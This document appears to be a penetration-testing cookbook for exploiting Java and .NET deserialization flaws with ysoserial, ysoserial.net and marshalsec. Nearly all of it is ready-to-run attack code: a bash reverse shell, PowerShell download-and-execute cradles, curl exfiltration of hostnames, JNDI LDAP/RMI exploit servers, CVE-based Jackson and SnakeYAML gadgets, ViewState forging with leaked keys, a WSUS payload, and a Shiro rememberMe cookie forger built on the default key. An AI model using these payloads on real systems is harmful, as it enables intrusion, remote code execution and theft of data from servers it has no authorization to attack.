# ysoserial / ysoserial.net command cookbook — Open WHEN: you have confirmed a Java ObjectInputStream or .NET BinaryFormatter/ViewState/Json.NET sink and need the exact gadget invocation for DNS, RCE, or revshell

All commands assume `ysoserial.jar` (Java) or `ysoserial.exe` (.NET) on PATH.
Pipe the raw `.ser` through `base64 -w0` / URL-encode before placing it in
the cookie / header / body the sink reads.

## Java — `Runtime.exec()` argument trap
`Runtime.exec()` splits on spaces and does NOT honor `>` `|` `$()` or quoting.
A bare `bash -c '...'` will be mangled. Wrap every multi-token Linux command:

```bash
# Linux: base64-wrap so the gadget's exec gets a single token chain
CMD='bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'
B64=$(printf '%s' "$CMD" | base64 -w0)
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,$B64}|{base64,-d}|{bash,-i}" > payload.ser
```
For Windows targets use PowerShell `-EncodedCommand` (UTF-16LE base64):
```bash
printf '%s' "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/p.ps1')" \
  | iconv -t UTF-16LE | base64 -w0      # paste into -Enc below
java -jar ysoserial.jar CommonsCollections4 \
  "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc <B64UTF16>" > payload.ser
```

## Java — DNS / HTTP quiet oracles (run these first)
```bash
# JDK-only, no library needed — proves readObject() is reached
java -jar ysoserial.jar URLDNS "http://$RAND.oast.live" > probe.ser
# Library-present confirmation via command-channel callback
java -jar ysoserial.jar CommonsCollections4 "dig $RAND.oast.live"        > probe.ser
java -jar ysoserial.jar CommonsCollections4 "nslookup $RAND.oast.live"   > probe.ser
java -jar ysoserial.jar CommonsCollections4 "curl http://$RAND.oast.live/$(hostname)" > probe.ser
# Windows DNS/HTTP exfil without bash
java -jar ysoserial.jar CommonsCollections4 "cmd /c nslookup $RAND.oast.live"
java -jar ysoserial.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://$RAND.oast.live/a a"
```

## Java — brute the chain when libraries are unknown
Spray every chain into a Burp-Intruder wordlist, one base64 blob per line:
```bash
for g in BeanShell1 Clojure CommonsBeanutils1 CommonsCollections1 \
  CommonsCollections2 CommonsCollections3 CommonsCollections4 \
  CommonsCollections5 CommonsCollections6 CommonsCollections7 Groovy1 \
  Hibernate1 Hibernate2 JBossInterceptors1 JRMPClient JSON1 JavassistWeld1 \
  Jdk7u21 MozillaRhino1 MozillaRhino2 Myfaces1 Myfaces2 ROME Spring1 \
  Spring2 Vaadin1 Wicket1; do
    java -jar ysoserial.jar "$g" "nslookup $g.$RAND.oast.live" 2>/dev/null \
      | base64 -w0; echo
done > intruder.txt
```
The DNS label that fires back names the working chain (`<chain>.<rand>.oast.live`).

## Java — JSF / .faces ViewState
Tell: `.faces` URL + `javax.faces.ViewState=rO0AB...` (base64 Java stream).
Generate a normal `ObjectInputStream` chain, base64 it, URL-encode, replace
the `javax.faces.ViewState` value. No MAC unless `STATE_SAVING_METHOD=server`
with a secret.

Storage tell from the HTML body:
- Client-side storage → `javax.faces.ViewState` value is `base64 (+ gzip) +
  Java object` (`rO0AB...` or `H4sIAAA...`). This is the deserialization path.
- Server-side storage → value looks like `value="-XXX:-XXXX"` (an opaque server
  token); the object never travels, so no deserialization here.

**Apache MyFaces with a documented default secret.** MyFaces client-side
ViewState is `encrypt → HMAC → base64 → urlencode`. If the deploy left the
default `org.apache.myfaces.SECRET` / `MAC_SECRET` in `web.config`/`*.xml`, you
can mint a valid, MAC-correct ViewState. Default algorithm is DES-ECB +
HMAC-SHA1. Documented default secrets to try:

| Algorithm | Base64 key |
|---|---|
| DES | `NzY1NDMyMTA=` |
| DESede (3DES) | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
| Blowfish | `NzY1NDMyMTA3NjU0MzIxMA` |
| AES CBC/PKCS5 | `NzY1NDMyMTA3NjU0MzIxMA==` |
| AES CBC (alt) | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
| AES CBC IV | `NzY1NDMyMTA3NjU0MzIxMA==` |

Pipeline to build the value: `serialized-object → encrypt(secret) →
hmac_sha1_sign(mac_secret) → base64 → urlencode`. Mojarra (JSF reference impl)
uses a different scheme — if MyFaces secrets do not verify, treat it as Mojarra.

## Java — JSON/YAML libs via marshalsec (FastJSON, Jackson, SnakeYAML, …)
```bash
mvn clean package -DskipTests          # build marshalsec.jar first
# Stand up a malicious LDAP referral server that returns an Exploit class
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://10.10.14.4:8000/#Exploit 1389
# RMI variant
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer  http://10.10.14.4:8000/#Exploit 1099
```
Then feed the polymorphic JSON the sink expects, e.g. a `$type`/`@type` value
pointing at a JdbcRowSetImpl/TemplatesImpl whose `dataSourceName` is
`ldap://10.10.14.4:1389/Exploit`. Pair with a class-hosting HTTP server on 8000.

## Java — Jackson polymorphic JSON (databind) without a JNDI server
Jackson with Polymorphic Type Handling on (`enableDefaultTyping()` or
`@JsonTypeInfo`) accepts a `["<className>", {...}]` wrapper-array and builds the
named class from the JSON. Fingerprint Jackson first by sending malformed JSON
and reading the error — these strings confirm it:
```
com.fasterxml.jackson.databind.exc.MismatchedInputException ...
   need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
org.codehaus.jackson.map ...          # older 1.x package name
```
Named-CVE gadgets that reach a JDBC/Spring sink (no extra LDAP server needed —
they pull a remote SQL/XML resource themselves):
```json
// CVE-2017-17485 — Spring FileSystemXmlApplicationContext fetches your XML
["org.springframework.context.support.FileSystemXmlApplicationContext","http://$RAND.oast.live/spel.xml"]

// CVE-2019-12384 — logback H2 JDBC RUNSCRIPT runs SQL from your host
["ch.qos.logback.core.db.DriverManagerConnectionSource",
 {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://$RAND.oast.live/inject.sql'"}]

// CVE-2020-36180 — commons-dbcp2 DriverAdapterCPDS, same H2 RUNSCRIPT trick
["org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS",
 {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://$RAND.oast.live/exec.sql'"}]

// CVE-2020-9548 — Anteros DBCP, blind DNS/LDAP oracle via healthCheckRegistry
["br.com.anteros.dbcp.AnterosDBCPConfig",{"healthCheckRegistry":"ldap://$RAND.oast.live"}]

// CVE-2017-7525 — TemplatesImpl, runs a base64'd class' static initializer (true RCE)
{"param":["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  {"transletBytecodes":["<base64-of-your-evil-class>"],"transletName":"a.b","outputProperties":{}}]}
```
The H2-RUNSCRIPT chains turn into RCE by hosting an `inject.sql` whose
`CREATE ALIAS ... AS '<java source>'` defines and calls a command-running
function. Match the gadget class to a library you confirmed is on the classpath.

## Java — SnakeYAML one-liner (no marshalsec build needed)
If the sink is `yaml.load(...)` without `SafeConstructor`, the `ScriptEngineManager`
+ `URLClassLoader` tag fetches and runs a class from your host — JDK-only:
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[ !!java.net.URL ["http://$RAND.oast.live/"] ]]
]
```
Host a JAR with a `META-INF/services/javax.script.ScriptEngineFactory` entry at
that URL; the factory's constructor is your code.

## Java — staged JRMP delivery (firewalled outbound, no library chain)
```bash
# Listener that serves a second-stage gadget to a JRMPClient blob
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "curl http://$RAND.oast.live"
java -jar ysoserial.jar JRMPClient "10.10.14.4:1099" > stage1.ser   # send stage1 to the sink
```

## .NET — ysoserial.net core invocations
```bash
# DNS oracle (quiet first shot)
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup $RAND.oast.live" -o base64
# Most-reliable RCE gadget across formatters
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "calc.exe"
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter   -o base64 -c "calc.exe"
# Windows revshell — build the inner PS payload UTF-16LE first
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/s.ps1')" \
  | iconv -t UTF-16LE | base64 -w0
ysoserial.exe -g ObjectDataProvider -f Json.Net -o base64 \
  -c "powershell -EncodedCommand <B64UTF16>"
```
Useful flags: `--minify` (smaller blob), `--test` (run the chain locally to
confirm before sending), `--raf -f Json.Net -c x` (list gadgets valid for a
formatter), `--sf xml -g <gadget>` (find xml-ish formatters for a gadget).
Note: output is UTF-16LE by default — do NOT re-encode a raw blob on Linux.

## .NET — Json.NET `$type` injection (TypeNameHandling != None)
Drop this object straight into the JSON body the sink parses:
```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",
 "MethodName":"Start",
 "ObjectInstance":{"$type":"System.Diagnostics.Process, System",
   "StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System",
     "FileName":"cmd","Arguments":"/c nslookup $RAND.oast.live"}}}
```

## .NET — ViewState (`__VIEWSTATE`, LosFormatter / `ObjectStateFormatter`)
```bash
# UNSIGNED ViewState (enableViewStateMac=false): no key needed
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "nslookup $RAND.oast.live" --apppath="/" --path="/page.aspx"
# SIGNED ViewState: you must supply the leaked machineKey to mint a valid MAC
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c calc" \
  --path="/page.aspx" --apppath="/" \
  --validationkey="<HEX>" --validationalg="SHA1" \
  --decryptionkey="<HEX>" --decryptionalg="AES" \
  --generator="<__VIEWSTATEGENERATOR value>"
```
`__VIEWSTATEGENERATOR` is page-specific and required when the key is set —
read it from the same hidden form that carries `__VIEWSTATE`.

## .NET — WSUS real-world SOAP sinks (CVE-2025-59287)
Endpoints reaching legacy formatters as the WSUS service account (often SYSTEM):
`/SimpleAuthWebService/SimpleAuth.asmx` (`GetCookie()` → `BinaryFormatter`) and
`/ReportingWebService.asmx` (`ReportEventBatch` → `SoapFormatter`).
```bash
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "powershell -NoP -W Hidden -Enc <B64>"
```
Embed the base64 gadget in a `ReportEventBatch` SOAP body POSTed to
`/ReportingWebService.asmx`; it fires when the console ingests the event.

## Apache Shiro `rememberMe` (default key still everywhere)
Shiro AES-CBC-encrypts a Java stream with the rememberMe key, base64s it into
the `rememberMe` cookie. With the key (default `kPH+bIxk5D2deZiIxcaaaA==`):
```bash
java -jar ysoserial.jar CommonsCollections2 "nslookup $RAND.oast.live" > p.ser
python3 - "$RAND" <<'PY'
import sys,base64
from Crypto.Cipher import AES   # pycryptodome
key=base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
iv =b"\x00"*16
raw=open("p.ser","rb").read()
pad=16-len(raw)%16; raw+=bytes([pad])*pad
ct=AES.new(key,AES.MODE_CBC,iv).encrypt(raw)
print(base64.b64encode(iv+ct).decode())   # -> Cookie: rememberMe=<this>
PY
```
Gadget must match Shiro's bundled libs (CC2 / CB1 are the usual hits).
